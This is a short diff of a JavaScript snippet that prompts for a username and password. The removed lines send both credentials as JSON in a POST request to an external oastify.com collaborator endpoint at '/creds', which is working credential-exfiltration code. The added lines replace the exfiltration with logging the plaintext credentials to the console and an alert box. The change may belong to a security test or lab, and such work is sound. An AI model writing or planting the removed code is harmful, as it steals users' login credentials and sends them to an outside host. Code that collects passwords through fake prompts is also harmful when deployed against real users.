@@ -1,17 +1,4 @@
 let username = prompt("Enter your username:");
 let password = prompt("Enter your password:");
-let collaboratorUrl = "https://bu9g70o6qs61b61evm8uw2nk2b83wukj.oastify.com";
-let xhr = new XMLHttpRequest();
-xhr.open("POST", collaboratorUrl + "/creds", true);
-xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-        console.log("Credentials sent successfully!");
-    } else if (xhr.readyState === 4) {
-        console.error("Error sending credentials:", xhr.statusText);
-    }
-};
-xhr.send(JSON.stringify({
-    username: username,
-    password: password
-}));
+console.log(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
+alert(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
